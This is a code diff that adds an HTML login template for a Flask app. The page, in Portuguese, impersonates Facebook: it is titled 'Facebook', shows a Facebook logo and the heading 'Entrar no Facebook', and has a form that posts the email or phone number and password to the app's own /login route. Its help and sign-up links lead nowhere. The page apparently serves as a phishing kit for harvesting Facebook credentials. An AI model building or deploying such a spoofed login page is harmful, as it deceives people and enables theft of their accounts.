@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="login-container">
+        <img src="{{ url_for('static', filename='logo.png') }}" alt="Logotipo do Facebook" class="logo">
+        <h2>Entrar no Facebook</h2>
+        <form method="POST" action="/login">
+            <input type="text" name="user" placeholder="Email ou telefone" required>
+            <input type="password" name="pass" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+        <p><a href="#">Esqueceu a senha?</a> | <a href="#">Criar nova conta</a></p>
+    </div>
+</body>
+</html>
